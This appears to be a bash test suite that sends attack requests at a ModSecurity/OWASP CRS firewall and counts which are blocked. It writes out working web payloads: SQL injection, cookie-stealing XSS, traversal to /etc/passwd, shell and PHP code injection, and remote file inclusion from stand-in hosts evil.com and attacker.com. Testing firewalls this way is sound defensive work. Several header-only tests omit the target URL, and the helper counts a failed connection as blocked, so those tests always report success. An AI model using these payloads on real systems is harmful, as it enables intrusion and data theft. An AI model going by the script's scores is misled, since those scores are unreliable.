#!/usr/bin/env bash
# =============================================================================
# WAF Attack Simulation Test Suite
# Tests ModSecurity + OWASP CRS detection/blocking
# Usage: bash test-waf.sh [WAF_URL]
# =============================================================================

WAF_URL="${1:-http://localhost:80}"
PASS=0; FAIL=0; TOTAL=0

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

header() { echo -e "\n${CYAN}${BOLD}=== $* ===${NC}"; }
pass()   { echo -e "  ${GREEN}[BLOCKED]${NC}  $*"; ((PASS++)); ((TOTAL++)); }
fail()   { echo -e "  ${RED}[ALLOWED]${NC}  $* ${RED}(WAF miss)${NC}"; ((FAIL++)); ((TOTAL++)); }
info()   { echo -e "  ${YELLOW}[INFO]${NC}    $*"; }

# Helper: expect HTTP 403/400/429/414 (blocked)
# Empty/000 response also counts as blocked (WAF may reset connection)
expect_blocked() {
  local desc="$1"; shift
  local code
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 4 --connect-timeout 3 "$@" 2>/dev/null)
  if [[ "$code" =~ ^(400|403|429|414)$ ]] || [[ -z "$code" ]] || [[ "$code" == "000" ]]; then
    local label="HTTP $code"
    [[ -z "$code" || "$code" == "000" ]] && label="Connection blocked/reset"
    pass "$desc  [$label]"
  else
    fail "$desc  [HTTP $code]"
  fi
}

# Helper: expect HTTP 2xx/3xx (allowed — whitelist / normal traffic)
expect_allowed() {
  local desc="$1"; shift
  local code
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 4 --connect-timeout 3 "$@" 2>/dev/null)
  if [[ "$code" =~ ^(200|201|204|301|302|304|404|501)$ ]]; then
    pass "$desc  [HTTP $code — correctly allowed]"
  else
    fail "$desc  [HTTP $code — should be allowed]"
  fi
}

echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          WAF Attack Simulation Test Suite                    ║"
echo "║          Target: $WAF_URL"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# --------------------------------------------------------------------------
header "1. SQL Injection (SQLi)"
# --------------------------------------------------------------------------
expect_blocked "Classic SQLi in GET param" \
  "$WAF_URL/?id=1'+OR+'1'%3D'1"

expect_blocked "UNION SELECT attack" \
  "$WAF_URL/?q=1+UNION+SELECT+null,username,password+FROM+users--"

expect_blocked "Blind SQLi with sleep()" \
  "$WAF_URL/?id=1;+SELECT+SLEEP(5)--"

expect_blocked "SQLi in cookie" \
  -H "Cookie: session=1'+OR+1=1--"

expect_blocked "SQLi in POST body" \
  -X POST -d "username=admin'--&password=x" "$WAF_URL/login"

expect_blocked "SQLi with stacked queries" \
  "$WAF_URL/?id=1;DROP+TABLE+users--"

# --------------------------------------------------------------------------
header "2. Cross-Site Scripting (XSS)"
# --------------------------------------------------------------------------
expect_blocked "Basic script tag XSS" \
  "$WAF_URL/?q=<script>alert(1)</script>"

expect_blocked "XSS with event handler" \
  "$WAF_URL/?name=<img+src=x+onerror=alert(document.cookie)>"

expect_blocked "XSS in User-Agent" \
  -H "User-Agent: <script>alert(xss)</script>"

expect_blocked "XSS with javascript: URI" \
  "$WAF_URL/?url=javascript:alert(1)"

expect_blocked "Encoded XSS attempt" \
  "$WAF_URL/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

expect_blocked "SVG XSS vector" \
  "$WAF_URL/?q=<svg+onload=alert(1)>"

# --------------------------------------------------------------------------
header "3. Local File Inclusion (LFI)"
# --------------------------------------------------------------------------
expect_blocked "Basic path traversal" \
  "$WAF_URL/?file=../../../../etc/passwd"

expect_blocked "Null byte LFI" \
  "$WAF_URL/?file=../../../../etc/passwd%00"

expect_blocked "Double-encoded traversal" \
  "$WAF_URL/?file=..%252F..%252F..%252Fetc%252Fpasswd"

expect_blocked "Windows path traversal" \
  "$WAF_URL/?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

expect_blocked "PHP wrapper LFI" \
  "$WAF_URL/?page=php://filter/convert.base64-encode/resource=/etc/passwd"

# --------------------------------------------------------------------------
header "4. Remote Code Execution (RCE)"
# --------------------------------------------------------------------------
expect_blocked "Shell command injection" \
  "$WAF_URL/?cmd=;id;whoami"

expect_blocked "Backtick command injection" \
  "$WAF_URL/?q=%60id%60"

expect_blocked "Pipe command injection" \
  "$WAF_URL/?q=test|cat+/etc/passwd"

expect_blocked "Python RCE attempt" \
  -X POST -d 'data=__import__("os").system("id")' "$WAF_URL/"

expect_blocked "PHP code injection" \
  "$WAF_URL/?code=<?php+system('id');?>"

# --------------------------------------------------------------------------
header "5. Remote File Inclusion (RFI)"
# --------------------------------------------------------------------------
expect_blocked "RFI via HTTP" \
  "$WAF_URL/?page=http://evil.com/shell.php"

expect_blocked "RFI via FTP" \
  "$WAF_URL/?include=ftp://attacker.com/malware.php"

# --------------------------------------------------------------------------
header "6. Scanner / Bot Detection"
# --------------------------------------------------------------------------
expect_blocked "Nikto scanner User-Agent" \
  -H "User-Agent: Nikto/2.1.6"

expect_blocked "sqlmap User-Agent" \
  -H "User-Agent: sqlmap/1.7"

expect_blocked "Nmap user agent" \
  -H "User-Agent: nmap"

expect_blocked "Missing User-Agent" \
  -H "User-Agent:"

expect_blocked "Gobuster User-Agent" \
  -H "User-Agent: gobuster/3.0"

# --------------------------------------------------------------------------
header "7. Protocol Violations"
# --------------------------------------------------------------------------
expect_blocked "Request URI too long (>2048 chars)" \
  "$WAF_URL/?q=$(python3 -c 'print("A"*2100)')"

expect_blocked "Null byte in URI" \
  "$WAF_URL/?q=test%00injection"

expect_blocked "Invalid HTTP method" \
  -X INVALIDMETHOD "$WAF_URL/"

# --------------------------------------------------------------------------
header "8. Web Shell Access"
# --------------------------------------------------------------------------
expect_blocked "PHP web shell path" \
  "$WAF_URL/uploads/shell.php"

expect_blocked "c99 web shell" \
  "$WAF_URL/c99.php"

expect_blocked "Common webshell filename" \
  "$WAF_URL/wp-content/uploads/cmd.php"

# --------------------------------------------------------------------------
header "9. Common Attack Paths"
# --------------------------------------------------------------------------
expect_blocked "WordPress admin brute force" \
  "$WAF_URL/wp-admin/"

expect_blocked "phpMyAdmin access" \
  "$WAF_URL/phpmyadmin/"

expect_blocked "Hidden .env file" \
  "$WAF_URL/.env"

expect_blocked "Git directory exposure" \
  "$WAF_URL/.git/config"

expect_blocked "htaccess exposure" \
  "$WAF_URL/.htaccess"

# --------------------------------------------------------------------------
header "10. HTTP Response Splitting / Header Injection"
# --------------------------------------------------------------------------
expect_blocked "CRLF injection in header" \
  -H $'X-Custom: value\r\nX-Injected: injected'

expect_blocked "HTTP response splitting" \
  "$WAF_URL/?redirect=http://example.com%0d%0aSet-Cookie:+evil=1"

# --------------------------------------------------------------------------
header "11. Positive Tests (Should Be ALLOWED)"
# --------------------------------------------------------------------------
expect_allowed "Normal GET request" \
  -H "User-Agent: Mozilla/5.0" "$WAF_URL/"

expect_allowed "Normal POST request" \
  -H "User-Agent: Mozilla/5.0" \
  -X POST -d "name=john&age=30" "$WAF_URL/"

expect_allowed "WAF health check endpoint" \
  -H "User-Agent: Mozilla/5.0" "$WAF_URL/waf-health"

# --------------------------------------------------------------------------
# Summary
# --------------------------------------------------------------------------
echo ""
echo -e "${BOLD}============================================================${NC}"
echo -e "${BOLD}  Results:${NC}"
echo -e "  ${GREEN}Blocked (correct):  $PASS${NC}"
echo -e "  ${RED}Allowed (WAF miss): $FAIL${NC}"
echo -e "  Total tests:        $TOTAL"
echo ""
PCTG=0
if [[ $TOTAL -gt 0 ]]; then
  PCTG=$(( PASS * 100 / TOTAL ))
fi
if [[ $PCTG -ge 90 ]]; then
  echo -e "  ${GREEN}WAF effectiveness: ${PCTG}% — Excellent${NC}"
elif [[ $PCTG -ge 70 ]]; then
  echo -e "  ${YELLOW}WAF effectiveness: ${PCTG}% — Good, tune CRS rules${NC}"
else
  echo -e "  ${RED}WAF effectiveness: ${PCTG}% — Review ModSecurity config${NC}"
fi
echo -e "${BOLD}============================================================${NC}"
echo ""
echo "  Audit log: sudo tail -f /var/log/waf/modsec_audit.log"
echo "  Access log: sudo tail -f /var/log/waf/access.log"
echo ""
